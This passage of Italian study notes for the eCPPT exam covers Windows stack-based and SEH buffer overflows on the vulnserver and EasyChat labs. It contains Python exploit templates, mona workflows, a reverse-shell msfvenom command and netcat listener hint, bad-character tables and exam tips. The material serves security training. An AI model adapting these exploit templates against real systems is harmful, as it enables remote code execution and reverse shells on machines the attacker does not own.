http_req += b"User-Agent: Mozilla/5.0\r\n"
http_req += b"Connection: close\r\n\r\n"

s = socket.socket()
s.connect((TARGET, PORT))
s.send(http_req)
s.close()
print(f"[+] Sent {len(http_req)} bytes")
```

### Exploit SEH completo (template)

```python
#!/usr/bin/env python3
import socket, struct

TARGET = "10.10.10.50"
PORT   = 80

# Valori derivati con mona
OFFSET_TO_NSEH = 220                          # da !mona pattern_offset
NSEH = b"\xEB\x06\x90\x90"                    # short jmp +6 + pad
SEH  = struct.pack("<I", 0x100139DB)          # POP POP RET in DLL no SafeSEH
NOPS = b"\x90" * 16

# msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0a\x0d\x20\x26\x3d" \
#          -f python -v SHELLCODE
SHELLCODE = b""  # incollare output msfvenom

# trigger padding per forzare l'eccezione
TAIL = b"D" * (3000 - OFFSET_TO_NSEH - 4 - 4 - len(NOPS) - len(SHELLCODE))

buffer  = b"A"*OFFSET_TO_NSEH + NSEH + SEH + NOPS + SHELLCODE + TAIL

http_req  = b"GET /chat.ghp?username=" + buffer + b" HTTP/1.1\r\n"
http_req += b"Host: " + TARGET.encode() + b"\r\n"
http_req += b"User-Agent: Mozilla/5.0\r\n"
http_req += b"Connection: close\r\n\r\n"

s = socket.socket()
s.connect((TARGET, PORT))
s.send(http_req)
s.close()
print(f"[+] Sent {len(http_req)} bytes — check calc.exe on target")
```

### Pulizia tra un test e l'altro

```
1. Close exploit script
2. Close Immunity Debugger
3. Riavvia EasyChat (Try it)
4. Open Immunity → File → Attach → easychat → F9
5. Re-run exploit
```

Questo ciclo "restart + reattach + rerun" è **esattamente** quello ripetuto più volte nel video.

---



### Quiz: SEH theory, workflow e lab EasyChat

<div class="ecppt-quiz" data-module="09_Buffer_Overflows" data-block="3"></div>

## 13. Mona.py cheat sheet

> 📋 La cheat sheet originalmente qui presente è stata spostata nel modulo dedicato: vedi [Cheat Sheet — sezione Buffer Overflows: Mona.py](../10_Cheatsheet.md#buffer-overflows-monapy).

---

## 14. Msfvenom cheat sheet

> 📋 La cheat sheet originalmente qui presente è stata spostata nel modulo dedicato: vedi [Cheat Sheet — sezione Buffer Overflows: msfvenom shellcode](../10_Cheatsheet.md#buffer-overflows-msfvenom-shellcode).

---

## 15. Python exploit skeleton (TCP socket)

Template generico riusabile per stack-based BO via TCP. Da adattare a SEH cambiando `EIP/JMP_ESP` con `NSEH/SEH` e il layout del payload.

```python
#!/usr/bin/env python3
"""
Exploit skeleton per Windows stack-based buffer overflow via TCP socket.
Sostituire OFFSET, JMP_ESP, SHELLCODE, PREFIX/SUFFIX in base al target.
"""
import socket
import struct
import sys
import time

# === CONFIG ===========================================================
TARGET_IP   = "10.10.10.50"
TARGET_PORT = 9999
TIMEOUT     = 5

# === PARAMETRI EXPLOIT (derivati con mona) ============================
OFFSET   = 2003                         # !mona pattern_offset -d <EIP>
JMP_ESP  = struct.pack("<I", 0x625011AF) # !mona jmp -r esp -m <module>
NOP_SLED = b"\x90" * 32

# msfvenom -p windows/shell_rev⁠erse_tcp LHOST=10.10.10.10 LPORT=4444 \
#          -b "\x00\x0a\x0d" -f python -v SHELLCODE
SHELLCODE = (
    b"\xdb\xc0\xb8..."                  # incollare output msfvenom
)

# === COSTRUZIONE PAYLOAD ==============================================
PREFIX  = b"TRUN /.:/"                  # comando vulnerabile (specifico target)
SUFFIX  = b"\r\n"

payload  = PREFIX
payload += b"A" * OFFSET                # junk fino a EIP
payload += JMP_ESP                      # overwrite EIP
payload += NOP_SLED                     # margine
payload += SHELLCODE                    # exec
payload += SUFFIX

print(f"[*] Payload length: {len(payload)} bytes")

# === INVIO ============================================================
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    s.connect((TARGET_IP, TARGET_PORT))

    banner = s.recv(1024)
    print(f"[+] Banner: {banner!r}")

    s.send(payload)
    time.sleep(2)
    s.close()

    print(f"[+] Exploit sent. Check listener on attacker (nc -lvnp 4444)")
except socket.timeout:
    print("[-] Timeout — il target potrebbe essere crashato. Verifica listener.")
except Exception as e:
    print(f"[-] Errore: {e}")
    sys.exit(1)
```

### Variante SEH

```python
# Layout per SEH overflow
OFFSET_TO_NSEH = 632
NSEH = b"\xEB\x06\x90\x90"                       # short jmp +6
SEH  = struct.pack("<I", 0x10019798)             # POP POP RET (no SafeSEH)
NOPS = b"\x90" * 16
TAIL = b"D" * 1500                               # trigger eccezione

payload = b"A"*OFFSET_TO_NSEH + NSEH + SEH + NOPS + SHELLCODE + TAIL
```

---

## 16. Tabella di confronto Stack BO vs SEH BO

| Aspetto | **Stack-based BO classico** | **SEH-based BO** |
|---|---|---|
| **Target dell'overwrite** | Return address (saved EIP) | SEH record sullo stack (NSEH + SEH handler) |
| **Cosa viene controllato** | EIP direttamente | Indirizzo di un handler che il dispatcher chiamerà |
| **Trigger dell'esecuzione** | Istruzione `RET` della funzione vulnerabile | **Eccezione** (access violation) gestita dal dispatcher SEH |
| **Gadget tipico** | `JMP ESP` (`\xFF\xE4`) o equivalente | `POP r32 ; POP r32 ; RET` |
| **Comando mona** | `!mona jmp -r esp -cpb "<bad>"` | `!mona seh -cpb "<bad>"` |
| **Pattern del payload** | `junk + EIP + NOPs + shellcode` | `junk + NSEH(short jmp) + SEH(P/P/R) + NOPs + shellcode + tail` |
| **Short jmp serve?** | No | **Sì** — `\xEB\x06\x90\x90` in NSEH |
| **Mitigazione che blocca** | DEP/NX (richiede ROP), ASLR (info leak) | **SafeSEH**, SEHOP |
| **Prerequisito per modulo gadget** | `ASLR/Rebase/NXCompat: False` | `SafeSEH/ASLR/Rebase: False` |
| **Quando si usa** | Buffer subito prima di saved EIP, distanza piccola | Buffer molto grande, EIP non raggiungibile direttamente, oppure protezione `/GS` sul return address |
| **Passo critico Immunity** | F9 (Run) | **Shift+F7** (Pass exception to application) |
| **Esempio lab del corso** | `vulnserver.exe` / TRUN (TCP 9999) | EasyChat Server (HTTP 80, parametro GET) |
| **Esegue subito al crash?** | Sì | No — serve che l'eccezione venga "passata" al dispatcher |

### Decision tree pratico

```
Crash con EIP = 41414141 ?
  ├── Sì → STACK CLASSICO → !mona jmp -r esp → workflow 7-step (sez. 9)
  └── No, ma SEH chain mostra 41414141 → SEH BO → Shift+F7 → !mona seh → workflow SEH (sez. 11)
```

---

## 17. Bad chars: lista universale e protocollo-specifica

### Bad chars **universali** (presenti quasi ovunque)

| Byte | Significato | Perché problematico |
|---|---|---|
| `\x00` | NULL | C string terminator → tronca lo shellcode |
| `\x0A` | LF (`\n`) | Line terminator → spesso fine input |
| `\x0D` | CR (`\r`) | Line terminator → idem |

### Bad chars **protocollo-specifici**

| Protocollo | Bad chars aggiuntivi |
|---|---|
| **HTTP (GET query string)** | `\x20` (spazio), `\x26` (`&`), `\x3D` (`=`), `\x23` (`#`), `\x25` (`%`), `\x2B` (`+`), `\x3F` (`?`) |
| **HTTP (header)** | `\x20`, `\x3A` (`:`), `\x0A`, `\x0D` |
| **SMTP** | `\x0A`, `\x0D`, `\x2E` (`.` come fine email) |
| **FTP** | `\x0A`, `\x0D`, comandi specifici |
| **SQL injection** | `\x27` (`'`), `\x22` (`"`), `\x3B` (`;`) |
| **URL-encoded** | `\x25` (`%`), `\x2B` (`+`) |

### Identificazione sistematica

Workflow standard:
1. `!mona bytearray -cpb "\x00"` (esclude già il NULL).
2. Iniettare il bytearray dopo EIP/SEH.
3. `!mona compare -f bytearray.bin -a <addr>` (dopo crash).
4. Aggiungere i byte alterati a `-cpb` e ripetere finché output di `compare` è "Unmodified".
5. Usare la lista finale come `-b "..."` per `msfvenom`.

---

## 18. Cosa il corso NON copre

Gap dichiarati o impliciti (utile saperli per il "context" eCPPT, **non per costruirli da zero in esame**):

- **Bypass mitigazioni moderne**: DEP/NX → **ROP chains**, ASLR → **info leak**, SafeSEH → tecniche avanzate, CFG, CET, Intel MPX/MPK. → argomenti di **OSED / Exploit Development avanzato** (offsec).
- **Heap overflow** — sovrascrittura metadati allocator, House of … attacks.
- **Format string vulnerabilities** — `printf(user_input)` con `%n`/`%s`.
- **64-bit exploitation** (x86_64): calling convention diversa (`rdi, rsi, rdx, rcx, r8, r9` su System V; `rcx, rdx, r8, r9` su Windows x64), RIP-relative addressing. Il corso è interamente **x86 32-bit**.
- **Use-After-Free, Double Free, Type Confusion** — vulnerabilità non-stack.
- **Kernel exploitation** (Windows token stealing, GDT/IDT manipulation).
- **Linux modern protections**: PIE, RELRO, stack canaries Glibc, Fortify Source (`_FORTIFY_SOURCE=2`).
- **Browser exploitation** (V8/JS engines, DOM bugs).
- **Mobile / ARM exploitation**.

---

## 19. Domande tipiche eCPPT su questo modulo

L'esame eCPPT 2024 è **45 domande multiple choice** in ambiente pratico. Su questo modulo è probabile che vengano mostrati screenshot di Immunity / output mona / payload Python e si chieda di scegliere il comportamento corretto.

### Tipologie più probabili

1. **Identificare il tipo di overflow** dato un crash log:
   - "EIP = 41414141 e ESP punta a `AAAA…`" → **stack classico**.
   - "EIP = 41414141 ma compare nella SEH chain" → **SEH overflow**.

2. **Scegliere il comando mona giusto**:
   - "Hai sovrascritto EIP, cosa lanci per trovare l'offset?" → `!mona pattern_offset -d 0x<EIP>`.
   - "Devi trovare un gadget JMP ESP" → `!mona jmp -r esp -cpb "..."`.
   - "Devi trovare un gadget per SEH" → `!mona seh -cpb "..."`.

3. **Riconoscere la struttura del payload**:
   - Stack: `junk + EIP + NOPs + shellcode`.
   - SEH: `junk + NSEH + SEH + NOPs + shellcode + tail`.

4. **Identificare il bad char** che spezza un exploit:
   - Vedi shellcode troncato dopo certi byte → cerca quel byte mancante nella lista bad.

5. **Interpretazione `!mona modules`**:
   - Domanda: "Quale modulo è adatto come fonte di gadget?" → quello con `Rebase/SafeSEH/ASLR/NXCompat = False`.

6. **Funzioni C unsafe**: dato uno snippet, riconoscere `strcpy`/`gets`/`sprintf` come vulnerabili.

7. **Linguaggi soggetti a BO**: "Il servizio è scritto in Java/C#/Python, è vulnerabile a BO classico?" → **No**.

8. **Little-endian**: dato `JMP ESP = 0x625011AF`, scegliere il byte order corretto nel Python → `\xAF\x11\x50\x62`.

9. **Shift+F7 in Immunity**: cosa fa? → "Pass exception to application", critico per SEH workflow.

10. **Lab association**:
    - vulnserver:9999 / TRUN → **stack classico**.
    - EasyChat:80 / HTTP GET → **SEH**.

### Memoria mnemonica della workflow universale

```
1. Crash con A*N         → conferma BO
2. pattern_create/offset → trova offset (EIP o SEH)
3. !mona modules         → identifica DLL no protections
4. !mona bytearray + compare → bad chars
5. !mona jmp -r esp  OR  !mona seh → gadget
6. msfvenom -b "<bad>" -f c → shellcode
7. Payload assembly + POC Python
8. Restart app + reattach debugger + run
```

---

## 20. Collegamenti ai file originali

Tutti i file sono in `../Exploit Development Buffer Overflows/`. La numerazione segue l'ordine dei video.

- [01 — Course Introduction](../Exploit Development Buffer Overflows/01_Course Introduction.md)
- [02 — Introduction to Buffer Overflows](../Exploit Development Buffer Overflows/02_Introduction to Buffer Overflows.md)
- [03 — Finding Buffer Overflows](../Exploit Development Buffer Overflows/03_Finding Buffer Overflows.md)
- [04 — Finding Buffer Overflows with Fuzzing](../Exploit Development Buffer Overflows/04_Finding Buffer Overflows with Fuzzing.md)
- [05 — Windows Stack Overflows](../Exploit Development Buffer Overflows/05_Windows Stack Overflows.md)
- [06 — Structured Exception Handling (SEH)](../Exploit Development Buffer Overflows/06_Structured Exception Handling (SEH).md)
- [07 — Windows SEH Overflow (EasyChat)](../Exploit Development Buffer Overflows/07_Windows SEH Overflow (EasyChat).md)
- [08 — Course Conclusion](../Exploit Development Buffer Overflows/08_Course Conclusion.md)

### Moduli eCPPT correlati

- **System Security & x86 Assembly Fundamentals** — prerequisito hard (registri, stack frame, calling convention, prologue/epilogue).
- **PowerShell for Pentesters** — AV evasion (Shellter, obfuscation) per delivery dello shellcode generato con msfvenom.
- **Network Penetration Testing** — exploitation pratica con Metasploit, handler `exploit/multi/handler`.
- **Privilege Escalation** — dopo aver ottenuto la reverse shell, escalation a SYSTEM su Windows.

---

> **Reminder esame eCPPT 2024**: 45 domande multiple choice in ambiente pratico, **niente report da consegnare**. Su questo modulo allenarsi sul lab **EasyChat** (SEH) e **vulnserver/TRUN** (stack classico) è il modo più efficace per consolidare la workflow e i comandi mona.
